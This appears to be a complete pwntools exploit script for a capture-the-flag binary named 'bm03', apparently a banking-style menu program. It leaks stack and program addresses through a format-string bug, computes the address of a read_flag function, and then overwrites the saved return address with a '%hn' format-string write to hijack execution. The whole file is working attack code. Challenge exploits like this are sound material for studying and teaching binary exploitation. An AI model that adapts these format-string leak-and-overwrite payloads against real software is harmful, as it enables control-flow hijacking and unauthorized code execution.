from pwn import *

context.terminal = ['termite', '-e']

account_id_counter = 0

def recv_input():
	x = p.recvuntil(":>")
	# print(x)

p = process('./bm03', env = {"TERM": "xterm-256color", "SHELL": "/usr/bin/zsh"})
# p = remote('bm03.allyourbases.co', 9010)
# p = gdb.debug('./bm03', env = {"TERM": "xterm-256color", "SHELL": "/usr/bin/zsh"})

e = ELF('./bm03')

recv_input()
p.sendline('2')
recv_input()

# creating user to leak esp

p.sendline('%x.%{}$x'.format(91*4)) # 91*4 is stack offset to something in program memory 
recv_input()
p.sendline('1')
recv_input()
p.sendline('1')
recv_input()
p.sendline('1')
recv_input()


# log in
p.sendline('1')
recv_input()
p.sendline('1')
recv_input()
p.sendline('1')
recv_input()

# create account 1

p.sendline('1')
recv_input()
p.sendline('1')
recv_input()

# create account 2

p.sendline('1')
recv_input()
p.sendline('1')
recv_input()

p.sendline('a')

# make transaction

p.sendline('2')
recv_input()

p.sendline(str(account_id_counter))
account_id_counter += 1
recv_input()
p.sendline(str(account_id_counter))
account_id_counter += 1
recv_input()
p.sendline('1')
recv_input()

p.sendline('1')
p.recvuntil('\'')
addrs = p.recvuntil('\'')[:-1]
addrs = [int(x,16) for x in addrs.split(b'.') if x not in b'']

p.sendline("")
recv_input()


p.sendline("")
p.sendline("0")
recv_input()
p.sendline("31337")
recv_input()


ebp = addrs[0] + 0x1b4
# ebp = 0xffffdb18
program_base = addrs[1] - 0xb203
# program_base = 0x56555000
saved_eip = ebp + 4
read_flag = program_base + e.symbols['_Z9read_flagv']
# print([hex(x) for x in addrs])
print("ebp: ", hex(ebp) )
print("program_base: ", hex(program_base))
print("read_flag: ", hex(read_flag & 0xfff))

# writing time

p.sendline('2')
recv_input()

# creating user to leak esp

base = '%{}$hn'.format(333)

pad = "%{}x".format((read_flag & 0xffff) - 0x15)
p.sendline(pad + base)
recv_input()
p.sendline('1')
recv_input()
p.sendline('2')
recv_input()
p.sendline('2')
recv_input()


# log in
p.sendline('1')
recv_input()
p.sendline('2')
recv_input()
p.sendline('2')
recv_input()

# create account 1

p.sendline('1')
recv_input()
p.sendline('1')
recv_input()

# create account 2

p.sendline('1')
recv_input()
p.sendline('1')
recv_input()

p.sendline('a')

# make transaction

p.sendline('2')
recv_input()

p.sendline(str(account_id_counter))
account_id_counter += 1
recv_input()
p.sendline(str(account_id_counter))
account_id_counter += 1
recv_input()
p.sendline('0')
recv_input()
p.sendline(p32(saved_eip) * 49)
recv_input()
p.sendline('')
recv_input()

p.sendline('0')

print(p.recvall())
